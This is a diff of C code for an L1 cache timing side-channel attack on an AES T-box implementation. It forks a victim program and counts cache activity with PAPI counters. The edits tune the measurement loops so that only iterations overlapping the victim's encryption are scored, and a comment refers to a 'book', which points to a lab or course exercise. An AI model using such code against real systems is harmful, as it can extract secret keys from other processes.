@@ -12,14 +12,13 @@
 #include <time.h>
 
 
-#define WAIT_TIME_T 100
 #define N_MEAS_T 200
 #define OUTTER_REP_T 200     //  number of times a measurement of a given L1 line is performed
 #define INNER_REP_T 150     //  number of times a measurement of a given L1 line is performed
 
-#define WAIT_TIME 1000
+#define OUTTER_MIN 50             // outter loop iteration that starts to measure * NEW *
 #define N_MEAS 500
-#define OUTTER_REPETITIONS 200     //  number of times a measurement of a given L1 line is performed
+#define OUTTER_REPETITIONS 250     //  number of times a measurement of a given L1 line is performed
 #define INNER_REPETITIONS 150     //  number of times a measurement of a given L1 line is performed
 
 #define L1_LINES 64
@@ -62,7 +61,7 @@ int main(void) {
     char plaintext2[16*(3+1)+1];
     long final_score[L1_LINES] = {0};
     long final_score2[L1_LINES] = {0};
-    long final[16] = {0};
+
     printf("### T-Box Mapping Info Extraction\n");
 
     for(int j = 0; j < N_MEAS_T ; j++){
@@ -83,7 +82,9 @@ int main(void) {
         if ( (pid = fork())== 0) 
             execv("./vic", args);
 
+        // usleep(WAIT_TIME_T);
 
+    
         for (iii = 0; iii < OUTTER_REP_T; iii++) {
     
             for ( min=0; min<SIZE32KB/W; min+=C_BLOCK_SIZE) {
@@ -128,6 +129,11 @@ int main(void) {
 
     printf("### Side Channel Information Extraction !\n"); // this print is required (check book)
 
+    // When attacking .so files in /tmp folder
+    // The interval around 50-300 OUTTER loop iterations
+    // intersects the time vic.c ciphering
+
+
     // Measurement loop
     for(int j = 0; j < N_MEAS ; j++){    
 
@@ -146,6 +152,8 @@ int main(void) {
         if ( (pid = fork())== 0) {
             execv("./vic", args);
         }
+
+        // usleep(WAIT_TIME);
 
 
         for (iii = 0; iii < OUTTER_REPETITIONS; iii++) {
@@ -168,8 +176,15 @@ int main(void) {
                 if (PAPI_stop(EventSet, values) != PAPI_OK)
                     handle_error(1,"stop");
 
-
-                final_score[min/C_BLOCK_SIZE] += values[0];
+                // This is needed since we are attacking
+                // .so file from /tmp directory
+                // somehow it takes more time to execute that code
+                // than it would require if it was compiled
+                // along with the victim
+                if( iii > OUTTER_MIN) {
+                    final_score[min/C_BLOCK_SIZE] += values[0];
+                }
+                
 
             }
         }
